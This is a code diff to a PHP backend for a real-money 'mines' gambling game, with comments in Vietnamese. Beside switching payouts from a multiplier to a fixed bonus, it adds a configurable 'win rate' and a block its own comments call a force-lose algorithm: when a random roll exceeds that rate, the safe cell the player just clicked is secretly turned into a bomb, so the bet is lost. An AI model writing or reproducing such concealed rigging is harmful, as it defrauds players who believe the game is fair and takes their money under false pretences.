@@ -12,9 +12,9 @@ $userId = $_SESSION['user_id'];
 $action = $_POST['action'] ?? '';
 
 // [QUAN TRỌNG] Đặt lệnh ALTER TABLE bên ngoài Transaction để chống lỗi Implicit Commit của MySQL
-// Đã chuyển sang thêm cột mines_multiplier thay vì mines_add_money
 try {
-    $pdo->exec("ALTER TABLE settings ADD COLUMN mines_multiplier FLOAT DEFAULT 1.2");
+    $pdo->exec("ALTER TABLE settings ADD COLUMN mines_add_money INT DEFAULT 5000");
+    $pdo->exec("ALTER TABLE settings ADD COLUMN mines_win_rate INT DEFAULT 40");
 } catch (Exception $e) {
     // Bỏ qua nếu cột đã tồn tại
 }
@@ -42,10 +42,10 @@ if ($action === 'start') {
         $newBalance = $user['balance'] - $bet;
         $pdo->prepare("UPDATE users SET balance = ? WHERE id = ?")->execute([$newBalance, $userId]);
 
-        // Lấy cài đặt mìn và hệ số nhân từ DB
-        $settings = $pdo->query("SELECT mines_bombs, mines_multiplier FROM settings WHERE id = 1")->fetch();
+        // Lấy cài đặt mìn và tiền cộng cố định từ DB
+        $settings = $pdo->query("SELECT mines_bombs, mines_add_money FROM settings WHERE id = 1")->fetch();
         $bombs = (int)$settings['mines_bombs'];
-        $mines_mul = (float)($settings['mines_multiplier'] ?? 1.2);
+        $mines_add = (int)($settings['mines_add_money'] ?? 5000);
 
         if ($bombs < 1 || $bombs > 24) $bombs = 3;
 
@@ -61,7 +61,7 @@ if ($action === 'start') {
             'pot' => $bet, // Quỹ ban đầu bằng tiền cược
             'board' => $board,
             'bombs' => $bombs,
-            'mines_mul' => $mines_mul, // Lưu hệ số nhân vào phiên chơi
+            'mines_add' => $mines_add, // Lưu mức cộng tiền vào phiên chơi
             'step' => 0,
             'status' => 'playing'
         ];
@@ -84,6 +84,18 @@ if ($action === 'open') {
     $index = (int)$_POST['index'];
     $mines = $_SESSION['mines'];
 
+    // Lấy config tỷ lệ thắng
+    $settings = $pdo->query("SELECT mines_win_rate FROM settings WHERE id = 1")->fetch();
+    $win_rate = (int)($settings['mines_win_rate'] ?? 40);
+
+    // --- BẮT ĐẦU THUẬT TOÁN ÉP THUA ---
+    // Can thiệp: Nếu rơi vào phần trăm "ép thua" và ô đó đang an toàn, nhà cái sẽ tự động dời mìn vào ô user vừa bấm.
+    $is_rigged_to_lose = (rand(1, 100) > $win_rate);
+    if ($mines['board'][$index] === 'safe' && $is_rigged_to_lose) {
+        $mines['board'][$index] = 'bomb'; // Ép chết ngay lập tức
+    }
+    // --- KẾT THÚC THUẬT TOÁN ÉP THUA ---
+
     if ($mines['board'][$index] === 'bomb') {
         // Đạp mìn -> Thua -> Mất toàn bộ Pot đang có
         $pdo->prepare("INSERT INTO mines_history (user_id, bet, win, net_profit, bombs, steps) VALUES (?, ?, 0, ?, ?, ?)")
@@ -91,9 +103,9 @@ if ($action === 'open') {
         unset($_SESSION['mines']);
         echo json_encode(['success' => true, 'is_bomb' => true, 'board' => $mines['board']]);
     } else {
-        // An toàn -> Nhân quỹ thưởng (pot) với hệ số và làm tròn đến hàng ngàn
+        // An toàn -> Cộng tiền cố định thay vì nhân hệ số
         $mines['step']++;
-        $mines['pot'] = (int)round(($mines['pot'] * $mines['mines_mul']) / 1000) * 1000;
+        $mines['pot'] += $mines['mines_add'];
 
         $_SESSION['mines'] = $mines;
 
